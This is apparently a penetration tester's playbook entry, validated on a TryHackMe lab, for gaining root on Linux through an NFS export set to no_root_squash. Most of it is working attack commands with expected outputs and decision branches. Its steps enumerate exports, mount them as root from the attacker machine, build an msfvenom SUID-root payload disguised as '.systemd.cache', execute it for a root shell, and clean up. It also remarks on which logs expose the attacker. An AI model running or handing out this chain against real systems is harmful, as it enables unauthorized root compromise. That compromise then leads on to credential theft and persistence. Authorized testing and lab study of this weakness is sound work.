
⚠️ **Hard preconditions — verified in Step 1 before any action.**

- **NFS server reachable from attacker** — confirmed informationally by `showmount -e` in Step 1 and definitively by the `mount` command in Step 2.
- An **`/etc/exports` line contains `no_root_squash`** — the enabling option.
- **Export is not hardened by `sec=krb5*`, `all_squash`, or marked `ro`** — these break the chain at auth, UID claim, and write respectively.
- **Client spec on the export line admits attacker's IP** (`*`, matching CIDR, or matching hostname).
- **Underlying filesystem hosting the export is NOT mounted `nosuid` or `noexec`** on the target — `nosuid` strips the SUID bit at exec; `noexec` blocks execution entirely.
- **Foothold user can traverse the exported path** (`+rx` on the directory chain leading to it).
- **Attacker holds root on their box** — required to `mount` and to claim UID 0 in NFS RPCs.

---

## Step 1 — Pre-flight checks

From **foothold shell** on **target**:

`awk '/no_root_squash/ && !/sec=krb5/ && !/all_squash/ && !/[(,]ro[,)]/' /etc/exports`

Returns export lines containing `no_root_squash` with no hardening blockers (`sec=krb5*`, `all_squash`, or `ro` as a standalone option).

- No output → no viable candidates. Return to [[Linux Privilege Escalation Checksheet]].
- Output present → for each candidate, capture:
  - `<export>` — first field (server-side path, e.g. `/srv/share`)
  - Client spec — second field (e.g. `*`, `192.168.1.0/24`, `attacker.lab`)

For each candidate in turn, branch on Client spec:

- `*`, matching CIDR, or matching hostname → proceed.
- Specific host / CIDR that excludes attacker IP → mount will be refused. Next candidate or return to [[Linux Privilege Escalation Checksheet]].
#### Check the underlying filesystem isn't mounted `nosuid` or `noexec` on the target:

`awk -v p=<export> '$4 ~ /nosuid|noexec/ && (p==$2 || $2=="/" || index(p, $2"/")==1) {print $2}' /proc/mounts` 

- No output → proceed. 
- Output present → BLOCKED (`nosuid` strips SUID at exec; `noexec` blocks execution entirely); the printed mountpoint(s) caused it. Inapplicable. Next candidate or return to [[Linux Privilege Escalation Checksheet]]. 

#### Confirm the foothold user can traverse the export path (will be needed at Step 4):

`ls -la <export> >/dev/null 2>&1 && echo OK || echo NOACCESS`

- `OK` → proceed.
- `NOACCESS` → foothold can't enter the path; SUID binary unreachable from this user. Inapplicable. Next candidate or return to [[Linux Privilege Escalation Checksheet]]

#### Confirm NFS service reachable (from attacker):

From **attacker**:

`showmount -e <ip>`

- Output lists `<export>` → server confirmed export is live and reachable. Proceed to Step 2.
- `clnt_create: RPC: Program not registered` → NFSv4-only (portmap not exposed); `showmount` can't confirm. Proceed to Step 2.
- `Connection refused` / `No route to host` / timeout → daemon not running or firewalled. Inapplicable. Return to [[Linux Privilege Escalation Checksheet]].

---

## Step 2 — Mount the export with root claim (from attacker)

From **attacker** (requires local root), attempt to mount with each known NFS major version until one succeeds:

`sudo mkdir -p /mnt/nfs; for v in 4 3 2; do sudo mount -t nfs -o vers=$v <ip>:<export> /mnt/nfs 2>/dev/null && grep -q " /mnt/nfs " /proc/mounts && { echo "mounted vers=$v"; break; }; done`

**Record `<vers>`**

#### Verify positively (kernel mount table is definitive):

`grep " /mnt/nfs " /proc/mounts`

- Output shows a line beginning `<ip>:<export> /mnt/nfs nfs ...` → mount succeeded; the previous command's `mounted vers=N` line names the version. Proceed.
- No output → no known major version mounted. Try next candidate from Step 1, or return to [[Linux Privilege Escalation Checksheet]].

#### Confirm `no_root_squash` is actually live (not just configured):

`sudo touch /mnt/nfs/.test && stat -c '%u:%g' /mnt/nfs/.test`

- `0:0` → root claim honoured by server. Proceed.
- `65534:65534` → squashed to nobody despite the config line. Try next candidate from Step 1, or return to [[Linux Privilege Escalation Checksheet]].
- Other → investigate `anonuid=` / `anongid=` overrides on the export line.

`sudo rm /mnt/nfs/.test`

---

## Step 3 — Generate and deploy SUID-root payload

From **foothold shell** on target, capture target architecture (sets payload selection for the msfvenom command below):

`uname -m`

- `x86_64` / `amd64` → `<payload>` = `linux/x64/exec` (native 64-bit). Proceed.
- `i686` / `i386` → `<payload>` = `linux/x86/exec` (native 32-bit). Proceed.
- `armv7l` → `<payload>` = `linux/armle/exec` (native 32-bit ARM). Proceed.
- Other → out of scope of this playbook.

From **attacker**, generate the payload (substitute the payload string captured above for `<payload>`):

`msfvenom -p <payload> CMD="/bin/bash -p" -f elf -o /tmp/.systemd.cache`

- `Payload size: N bytes` printed, exit 0 → proceed.

Deploy via the NFS mount (attacker acting as root via `no_root_squash`; `cp` lands as `0:0` — no `chown` needed):

`sudo cp /tmp/.systemd.cache /mnt/nfs/.systemd.cache && sudo chmod 4755 /mnt/nfs/.systemd.cache`

Verify:

`ls -la /mnt/nfs/.systemd.cache`

- `-rwsr-xr-x 1 root root` → SUID-root payload in place. Proceed.
- Owner not `root` → `no_root_squash` not actually applied; revisit Step 2 confirmation.
- No `s` in mode → `chmod` didn't take; check error output.

---

## Step 4 — Execute on target

From **foothold shell** on target:

`<export>/.systemd.cache`

`id`

- `uid=0(root)` or `euid=0(root)` → root achieved. Proceed to Decision.
- `uid=<foothold> euid=<foothold>` → SUID bit not honored at exec; revisit Step 3 verify and Step 1 nosuid check.
- `Permission denied` → Step 1 nosuid/noexec check missed something (re-run it; if it returns `OK`, the cause is non-DAC: SELinux / AppArmor / fapolicyd blocking the exec).
- `No such file or directory` → cp at Step 3 didn't reach the expected export path; confirm the path matches `<export>` from Step 1.

---

## Step 5 — Cleanup

From the **new root shell on target**:

`rm <export>/.systemd.cache`

From **attacker**:

`sudo umount /mnt/nfs && sudo rmdir /mnt/nfs`

⚠️ NFS mount operations are logged by `rpc.mountd` (NFSv3) or the `nfs-server` systemd journal (NFSv4) on the target — entries reveal attacker IP, timestamp, and exported path. The SUID-root bash on the export is removed above; log cleanup is out of scope.

---

## Decision

Root shell achieved. Next steps are goal-dependent; common destinations:

- Credential extraction → [[Linux Credential Extraction Checksheet]]
- Persistence → [[Linux Persistence Checksheet]]
- Lateral movement → [[Linux Lateral Movement Checksheet]]

---

## Validation

THM:Linux PrivEsc:Task 19 NFS